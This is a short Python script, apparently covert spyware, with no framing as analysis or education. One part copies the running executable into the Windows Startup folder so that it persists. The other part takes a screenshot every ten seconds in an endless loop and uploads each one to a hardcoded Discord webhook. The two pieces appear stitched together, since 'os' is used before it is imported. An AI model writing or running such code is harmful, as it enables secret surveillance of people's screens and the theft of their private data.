import sys
import shutil

def add_to_startup():
    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    shutil.copy(sys.executable, startup)

if __name__ == "__main__":
    add_to_startup()
import pyautogui
import time
import os
from discord_webhook import DiscordWebhook
# Create a directory for screenshots if it doesn't exist
screenshot_dir = "screenshots"
if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)
# Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1312530969378422816/CF1lslrfYWpimQxu-Q2N0_nXrRnGjhJ0S6Vb5jrb_aP72_FQsGU5plvixYGTXTf0-bQe"

# Function to capture and send screenshot with additional info
def capture_and_send_screenshot(counter):
    screenshot = pyautogui.screenshot()
    filename = os.path.join(screenshot_dir, f"screenshot_{counter}.png")
    screenshot.save(filename)

    # Sending the screenshot to Discord
    webhook = DiscordWebhook(url=webhook_url)
    with open(filename, 'rb') as f:
        webhook.add_file(file=f, filename=os.path.basename(filename))
        webhook.execute()

    os.system("echo done > com1")

# Main loop to take screenshots every 10 seconds
counter = 1
while True:
    capture_and_send_screenshot(counter)
    counter += 1
    time.sleep(10)
